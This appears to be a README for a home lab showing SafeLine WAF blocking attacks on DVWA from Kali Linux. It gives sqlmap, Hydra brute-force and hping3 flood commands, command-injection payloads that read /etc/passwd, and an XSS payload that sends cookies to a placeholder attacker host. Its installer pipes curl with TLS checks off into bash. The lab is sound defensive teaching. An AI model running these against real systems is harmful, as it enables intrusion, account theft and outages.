# 🛡️ SafeLine WAF — Cybersecurity Home Lab

> A hands-on cybersecurity home lab simulating real-world web application attacks and defenses using SafeLine Web Application Firewall, DVWA, Kali Linux, and Ubuntu Server.

---

## 📋 Table of Contents
- [Project Overview](#-project-overview)
- [Lab Architecture](#-lab-architecture)
- [Tools & Technologies](#-tools--technologies)
- [Lab Setup](#-lab-setup)
- [Attack Demonstrations](#-attack-demonstrations)
- [Results](#-results)
- [Key Learnings](#-key-learnings)
- [Skills Demonstrated](#-skills-demonstrated)

---

## 🎯 Project Overview

This project demonstrates a complete attacker-victim cybersecurity scenario where:

- **Kali Linux** acts as the attacker machine
- **Ubuntu Server** hosts the vulnerable web application (DVWA)
- **SafeLine WAF** sits as a reverse proxy between attacker and victim — inspecting and blocking malicious traffic

The goal is to simulate real-world web attacks and demonstrate how a Web Application Firewall effectively defends against them.

---

## 🏗️ Lab Architecture

```
┌─────────────────────┐
│   Kali Linux        │
│   (Attacker)        │
│   192.168.100.x     │
└──────────┬──────────┘
           │
           │  SQL Injection, XSS,
           │  Brute Force, HTTP Flood
           │
           ▼
┌─────────────────────┐
│   SafeLine WAF      │
│   (Reverse Proxy)   │
│   Port 80 / 443     │
│                     │
│  🛡️ Inspects &      │
│     Blocks Attacks  │
└──────────┬──────────┘
           │
           │  Clean traffic only
           │
           ▼
┌─────────────────────┐
│   Ubuntu Server     │
│   (Victim)          │
│   192.168.100.19    │
│                     │
│   Apache (Port 8080)│
│   MySQL             │
│   DVWA              │
└─────────────────────┘
```

**Network Type:** VirtualBox Bridged Networking

---

## 🛠️ Tools & Technologies

| Tool | Purpose |
|------|---------|
| VirtualBox | Virtual machine hypervisor |
| Kali Linux | Attacker OS with security tools |
| Ubuntu Server | Victim OS hosting DVWA |
| Apache2 | Web server (port 8080) |
| MySQL 8.4 | Database backend for DVWA |
| PHP 8.5 | Server-side scripting |
| DVWA | Damn Vulnerable Web Application |
| SafeLine WAF | Web Application Firewall (reverse proxy) |
| OpenSSL | Self-signed SSL certificate generation |
| SQLmap | Automated SQL injection testing |
| Hydra | Brute force attack tool |
| hping3 | HTTP flood / DoS testing |

---

## ⚙️ Lab Setup

### 1️⃣ Virtual Machine Configuration
- Created 2 VMs in VirtualBox with **Bridged Networking**
- Verified connectivity between VMs using `ping`

### 2️⃣ DVWA Installation on Ubuntu
```bash
# Install LAMP Stack
sudo apt install apache2 mysql-server php php-mysqli php-gd libapache2-mod-php git -y

# Download DVWA
cd /var/www/html
sudo wget https://github.com/digininja/DVWA/archive/refs/heads/master.zip
sudo unzip master.zip
sudo mv DVWA-master DVWA

# Set permissions
sudo chown -R www-data:www-data /var/www/html/DVWA
sudo chmod -R 755 /var/www/html/DVWA
```

### 3️⃣ Apache Port Configuration
Changed Apache from port 80 → 8080 to allow SafeLine WAF to take port 80/443:
```bash
# /etc/apache2/ports.conf
Listen 8080

# /etc/apache2/sites-available/000-default.conf
<VirtualHost *:8080>
```

### 4️⃣ DNS Configuration
```bash
# /etc/hosts (both machines)
192.168.100.19    webserver.thesocialdork
```

### 5️⃣ SSL Certificate Generation
```bash
openssl genrsa -out private.key 4096
openssl req -new -key private.key -out private.csr
openssl x509 -req -days 365 -in private.csr -signkey private.key -out private.crt
```

### 6️⃣ SafeLine WAF Installation
```bash
bash -c "$(curl -fsSLk https://waf.chaitin.com/release/latest/manager.sh)" -- --en
```
- Dashboard: `https://192.168.100.19:9443`
- Added DVWA as protected application
- Configured reverse proxy: `443 → localhost:8080`
- Imported SSL certificate

---

## ⚔️ Attack Demonstrations

### 💉 1. SQL Injection

**Tool:** Browser + SQLmap  
**DVWA Module:** SQL Injection (Security: Low)

```bash
# SQLmap automated attack
sqlmap -u "http://webserver.thesocialdork/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=<session>;security=low" \
--dbs
```

| | WAF ON 🛡️ | WAF OFF ❌ |
|--|-----------|-----------|
| Result | Access Forbidden | All user data exposed |
| SafeLine Log | Attack detected & blocked | No protection |

---

### 🖥️ 2. Cross-Site Scripting (XSS)

**Tool:** Browser  
**DVWA Module:** XSS Stored (Security: Low)

```javascript
// Payload used
<script>alert('Hacked!')</script>

// Real world cookie stealing payload
<script>document.location='http://attacker/?c='+document.cookie</script>
```

| | WAF ON 🛡️ | WAF OFF ❌ |
|--|-----------|-----------|
| Result | Script blocked | Alert popup executed |
| Impact | No script execution | Session hijacking possible |

---

### 🔐 3. Brute Force

**Tool:** Hydra  
**DVWA Module:** Brute Force (Security: Low)

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
192.168.100.19 http-post-form \
"/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect"
```

| | WAF ON 🛡️ | WAF OFF ❌ |
|--|-----------|-----------|
| Result | IP banned after 3 requests | Password cracked |
| SafeLine Rule | Rate limit: 3 req/10sec | No protection |

---

### 🌊 4. HTTP Flood (DoS)

**Tool:** hping3

```bash
hping3 -S --flood -V -p 80 webserver.thesocialdork
```

| | WAF ON 🛡️ | WAF OFF ❌ |
|--|-----------|-----------|
| Result | IP banned, requests blocked | Server overwhelmed |
| SafeLine Rule | HTTP Flood protection active | No protection |

---

### 💻 5. Command Injection

**Tool:** Browser  
**DVWA Module:** Command Injection (Security: Low)

```bash
# Payloads used
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
127.0.0.1 && id
```

| | WAF ON 🛡️ | WAF OFF ❌ |
|--|-----------|-----------|
| Result | Command blocked | System commands executed |
| Impact | Server protected | Full server compromise |

---

## 📊 Results Summary

| Attack | WAF ON | WAF OFF |
|--------|--------|---------|
| SQL Injection | ✅ BLOCKED | ❌ Data Exposed |
| XSS Stored | ✅ BLOCKED | ❌ Script Executed |
| Brute Force | ✅ IP Banned | ❌ Password Cracked |
| HTTP Flood | ✅ Rate Limited | ❌ Server Flooded |
| Command Injection | ✅ BLOCKED | ❌ RCE Possible |

---

## 📚 Key Learnings

- ✅ How a Web Application Firewall works as a reverse proxy
- ✅ Configuring LAMP stack on Ubuntu Server
- ✅ SSL/TLS certificate generation with OpenSSL
- ✅ Real-world web attack techniques (SQLi, XSS, Brute Force)
- ✅ WAF rule configuration and tuning
- ✅ Reading and analyzing WAF attack logs
- ✅ Difference between Defense Mode and Audit Mode in WAF
- ✅ Network configuration in virtualized environments

---

## 💡 Skills Demonstrated

```
Offensive Security    → SQL Injection, XSS, Brute Force, Command Injection
Defensive Security    → WAF configuration, rule tuning, log analysis
Linux Administration  → Ubuntu Server, Apache, MySQL, PHP configuration
Networking            → Reverse proxy, DNS, SSL/TLS, port management
Security Tools        → SQLmap, Hydra, hping3, OpenSSL, SafeLine WAF
```

---

## 🔗 References

- [SafeLine WAF](https://waf.chaitin.com)
- [DVWA — Damn Vulnerable Web Application](https://github.com/digininja/DVWA)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Kali Linux Tools](https://www.kali.org/tools/)

---

> ⚠️ **Disclaimer:** This lab is built purely for educational purposes in a controlled virtual environment. All attacks were performed on intentionally vulnerable software. Never perform these attacks on systems you don't own or have permission to test.

---

⭐ **If you found this helpful, please star this repository!**
